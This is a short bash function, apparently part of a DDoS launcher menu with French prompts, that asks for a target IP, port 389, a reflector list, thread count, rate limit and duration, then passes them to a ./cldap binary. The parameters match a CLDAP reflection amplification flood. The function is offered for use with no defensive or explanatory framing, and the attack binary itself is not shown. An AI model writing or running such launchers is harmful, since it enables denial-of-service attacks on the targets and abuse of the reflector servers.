cldap(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT (389): "
read port
echo -en "
│ LISTE : "
read liste
echo -en "
│ THREADS (100-1000) : "
read threads
echo -en "
│ LIMITER (-1) : "
read limiter
echo -en "
│ TEMPS : "
read time
./cldap ${ip} ${port} ${liste} ${threads} ${limiter} ${time}
}

